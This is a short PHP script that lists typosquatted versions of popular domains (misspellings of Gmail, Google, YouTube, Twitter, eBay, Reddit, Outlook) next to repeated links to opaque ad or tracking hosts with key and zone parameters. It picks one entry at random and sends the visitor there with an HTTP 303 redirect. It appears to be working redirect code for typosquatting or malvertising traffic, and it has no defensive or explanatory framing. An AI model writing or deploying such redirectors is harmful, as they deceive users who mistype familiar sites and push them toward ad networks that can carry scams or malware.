<?php
/**
 * Created by PhpStorm.
 * User: Azathoth
 * Date: 29. 3. 2016
 * Time: 14:54
 */

$addresses = [
	'https://gmqil.com',
	'https://gmil.com',
	'http://ggmail.com',
	'http://geogle.com',
	'http://ghogle.com',
	'http://goigle.com',
	'http://googae.com',
	'http://googee.com',
	'http://googfe.com',
	'http://googhe.com',
	'http://googln.com',
	'http://outloik.com',
	'http://googme.com',
	'http://googpe.com',
	'http://googre.com',
	'http://voovle.com',
	'http://redditt.com',
	'http://gookle.com',
	'http://goolle.com',
	'http://twltter.com',
	'http://ebbay.com',
	'http://gopgle.com',
	'http://giigle.com',
	'http://gopgle.com',
	'http://gpogle.com',
	'http://ggmail.com',
	'http://youtubd.com',
	'http://youtubs.com',
	'http://youtubu.com',
	'http://gmial.com',
	'http://gyoutube.com',
	'http://oyoutube.com',
	'http://goooogle.com',
	'http://youtibe.com',
	'http://yuotube.com',
	'http://yotube.com',
	'http://googe.com',
	'https://u21drwj6mp.com/tb7tasqky?key=0f22c1fd609f13cb7947c8cabfe1a90d&psid=14969160',
	'https://u21drwj6mp.com/tb7tasqky?key=0f22c1fd609f13cb7947c8cabfe1a90d&psid=14969160',
	'https://u21drwj6mp.com/tb7tasqky?key=0f22c1fd609f13cb7947c8cabfe1a90d&psid=14969160',
	'https://u21drwj6mp.com/tb7tasqky?key=0f22c1fd609f13cb7947c8cabfe1a90d&psid=14969160',
	'https://u21drwj6mp.com/tb7tasqky?key=0f22c1fd609f13cb7947c8cabfe1a90d&psid=14969160',
	'https://u21drwj6mp.com/tb7tasqky?key=0f22c1fd609f13cb7947c8cabfe1a90d&psid=14969160',
	'https://u21drwj6mp.com/tb7tasqky?key=0f22c1fd609f13cb7947c8cabfe1a90d&psid=14969160',
	'https://u21drwj6mp.com/tb7tasqky?key=0f22c1fd609f13cb7947c8cabfe1a90d&psid=14969160',
	'https://u21drwj6mp.com/tb7tasqky?key=0f22c1fd609f13cb7947c8cabfe1a90d&psid=14969160',
	'https://u21drwj6mp.com/tb7tasqky?key=0f22c1fd609f13cb7947c8cabfe1a90d&psid=14969160',
	'https://u21drwj6mp.com/tb7tasqky?key=0f22c1fd609f13cb7947c8cabfe1a90d&psid=14969160',
	'https://u21drwj6mp.com/tb7tasqky?key=0f22c1fd609f13cb7947c8cabfe1a90d&psid=14969160',
	'https://u21drwj6mp.com/tb7tasqky?key=0f22c1fd609f13cb7947c8cabfe1a90d&psid=14969160',
	'https://u21drwj6mp.com/tb7tasqky?key=0f22c1fd609f13cb7947c8cabfe1a90d&psid=14969160',
	'https://u21drwj6mp.com/tb7tasqky?key=0f22c1fd609f13cb7947c8cabfe1a90d&psid=14969160',
	'https://u21drwj6mp.com/tb7tasqky?key=0f22c1fd609f13cb7947c8cabfe1a90d&psid=14969160',
	'http://0byv9mgbn0.com/uy3b9ysb?key=0f22c1fd609f13cb7947c8cabfe1a90d&psid=14948518',
	'http://0byv9mgbn0.com/uy3b9ysb?key=0f22c1fd609f13cb7947c8cabfe1a90d&psid=14948518',
	'http://0byv9mgbn0.com/uy3b9ysb?key=0f22c1fd609f13cb7947c8cabfe1a90d&psid=14948518',
	'http://0byv9mgbn0.com/uy3b9ysb?key=0f22c1fd609f13cb7947c8cabfe1a90d&psid=14948518',
	'http://0byv9mgbn0.com/uy3b9ysb?key=0f22c1fd609f13cb7947c8cabfe1a90d&psid=14948518',
	'http://0byv9mgbn0.com/uy3b9ysb?key=0f22c1fd609f13cb7947c8cabfe1a90d&psid=14948518',
	'http://0byv9mgbn0.com/uy3b9ysb?key=0f22c1fd609f13cb7947c8cabfe1a90d&psid=14948518',
	'http://0byv9mgbn0.com/uy3b9ysb?key=0f22c1fd609f13cb7947c8cabfe1a90d&psid=14948518',
	'https://www.megdexchange.com/jump/next.php?r=3064091',
	'https://ofgogoatan.com/afu.php?zoneid=1407888&var=1803693',
];

$size = count($addresses);
$randomIndex = rand(0, $size - 1);
$randomUrl = $addresses[$randomIndex];

header('Location: ' . $randomUrl, true, 303);